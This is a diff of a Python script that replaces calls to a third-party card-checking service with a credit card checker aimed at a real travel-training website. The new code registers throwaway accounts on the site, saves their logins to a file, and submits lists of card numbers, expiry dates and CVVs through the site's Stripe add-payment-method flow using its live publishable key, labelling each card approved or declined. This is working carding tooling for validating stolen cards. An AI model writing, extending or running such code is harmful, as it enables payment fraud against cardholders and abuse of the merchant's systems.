@@ -3,125 +3,144 @@ import re
 import random
 import time
 import string
-import base64
 from bs4 import BeautifulSoup
-import requests
 
-def Tele(ccx):
-    # Strip any extra spaces
-    ccx = ccx.strip()
+def generate_random_email(length=8, domain=None):
+    """Generate a random email address"""
+    if domain is None:
+        domain = random.choice(["gmail.com"])
+    chars = string.ascii_lowercase + string.digits
+    local_part = ''.join(random.choice(chars) for _ in range(length))
+    return f"{local_part}@{domain}"
+
+def create_session():
+    """Create and return an authenticated session"""
+    session = requests.Session()
+    email = generate_random_email()
+    
+    # Initial headers
+    headers = {
+        'authority': 'www.thetravelinstitute.com',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+    }
 
     try:
-        # Split the card details into number, month, year, and CVC
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3]
-    except IndexError:
-        print(f"Error: The input string {ccx} is not in the correct format.")
+        # Get registration page
+        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
+        response.raise_for_status()
+        
+        # Parse nonce values
+        soup = BeautifulSoup(response.text, 'html.parser')
+        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
+        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
+
+        # Registration data
+        data = {
+            'afurd_field_nonce': nonce,
+            'email': email,
+            'password': 'Esahatam2009@',
+            'woocommerce-register-nonce': noncee,
+            'register': 'Register',
+        }
+
+        # Submit registration
+        response = session.post('https://www.thetravelinstitute.com/register/', 
+                               data=data, headers=headers, timeout=20)
+        response.raise_for_status()
+
+        # Save credentials if successful
+        if response.status_code == 200:
+            with open('Creds.txt', 'a') as f:
+                f.write(f"{email}:Esahatam2009@\n")
+            return session
+
+    except Exception as e:
+        print(f"Error creating session: {str(e)}")
+        return None
+
+def check_credit_card(cc, session):
+    """Check a single credit card using the provided session"""
+    try:
+        card_parts = cc.split("|")
+        cc_num = card_parts[0].strip()
+        mm = card_parts[1].strip()
+        yy = card_parts[2].strip().replace('20', '')
+        cvv = card_parts[3].strip()
+
+        # Get payment method page
+        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', timeout=20)
+        response.raise_for_status()
+        
+        # Extract Stripe nonce
+        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)
+
+        # Create Stripe payment method
+        stripe_data = {
+            'type': 'card',
+            'card[number]': cc_num,
+            'card[cvc]': cvv,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'billing_details[address][postal_code]': '10080',
+            'billing_details[address][country]': 'US',
+            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
+        }
+
+        response = session.post('https://api.stripe.com/v1/payment_methods', 
+                              data=stripe_data, timeout=20)
+        stripe_response = response.json()
+
+        if 'error' in stripe_response:
+            error_msg = stripe_response['error'].get('message', 'Unknown error')
+            if 'code' in error_msg.lower():
+                return f"CCN ✅ {cc} - {error_msg}"
+            return f"Declined ❌ {cc} - {error_msg}"
+
+        # Process setup intent
+        payment_method_id = stripe_response['id']
+        setup_intent_data = {
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': payment_method_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': nonce,
+        }
+
+        response = session.post('https://www.thetravelinstitute.com/',
+                              params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
+                              data=setup_intent_data,
+                              timeout=20)
+        setup_response = response.json()
+
+        if setup_response.get('success'):
+            return f"Approved ✅ {cc}"
+        else:
+            error_msg = setup_response['data']['error'].get('message', 'Unknown error')
+            return f"Declined ❌ {cc} - {error_msg}"
+
+    except Exception as e:
+        return f"Error ❌ {cc} - {str(e)}"
+
+def process_cards(cc_list):
+    """Process a list of credit cards"""
+    session = create_session()
+    if not session:
+        print("Failed to create session")
         return
 
-    # Shorten year if necessary (e.g., '2028' becomes '28')
-    if "20" in yy:
-        yy = yy.split("20")[1]
+    results = []
+    for cc in cc_list:
+        result = check_credit_card(cc, session)
+        print(result)
+        results.append(result)
+        time.sleep(1)  # Rate limiting
 
-    # Create a session
+    return results
 
-    # Example headers (customize as needed)
-    headers = {
-        'authority': 'api.chkr.cc',
-        'method': 'POST',
-        'path': '/',
-        'scheme': 'https',
-        'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'Content-Length': '44',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://chkr.cc',
-        'Referer': 'https://chkr.cc/',
-        'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'Sec-Ch-Ua-Mobile': '?1',
-        'Sec-Ch-Ua-Platform': '"Android"',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    # Example data payload (customize as needed)
-    data = {
-         'data':  f'{n}|{mm}|20{yy}|{cvc}',
-         'key': '',
-    }
-
-
-    # Make an API request (using a legitimate API, not the one you're working with)
-    # This is just a placeholder for a legitimate use case, e.g., Stripe API or any other
-    response = requests.post('https://api.chkr.cc/', headers=headers, data=data).json()
-    try:
-    	ii=response['msg']
-    except:
-    	return 'Live' or 'Thank You'
-    return ii
-import requests
-
-def Tele1(ccx):
-    # Strip any extra spaces
-    ccx = ccx.strip()
-
-    try:
-        # Split the card details into number, month, year, and CVC
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3]
-    except IndexError:
-        print(f"Error: The input string {ccx} is not in the correct format.")
-        return
-
-    # Shorten year if necessary (e.g., '2028' becomes '28')
-    if "20" in yy:
-        yy = yy.split("20")[1]
-
-    # Create a session
-
-    # Example headers (customize as needed)
-    headers = {
-        'authority': 'api.chkr.cc',
-        'method': 'POST',
-        'path': '/',
-        'scheme': 'https',
-        'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'Content-Length': '44',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://chkr.cc',
-        'Referer': 'https://chkr.cc/',
-        'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'Sec-Ch-Ua-Mobile': '?1',
-        'Sec-Ch-Ua-Platform': '"Android"',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    # Example data payload (customize as needed)
-    data = {
-         'data':  f'{n}|{mm}|20{yy}|{cvc}',
-         'key': '',
-    }
-
-
-    # Make an API request (using a legitimate API, not the one you're working with)
-    # This is just a placeholder for a legitimate use case, e.g., Stripe API or any other
-    response = requests.post('https://api.chkr.cc/', headers=headers, data=data).json()
-    try:
-    	ii=response['msg']
-    except:
-    	return 'Live' or 'Thank You'
-    return ii
+# Example usage
+if __name__ == "__main__":
+    test_cards = [
+        "4111111111111111|12|2025|123",
+        "4242424242424242|03|2026|456"
+    ]
+    process_cards(test_cards)
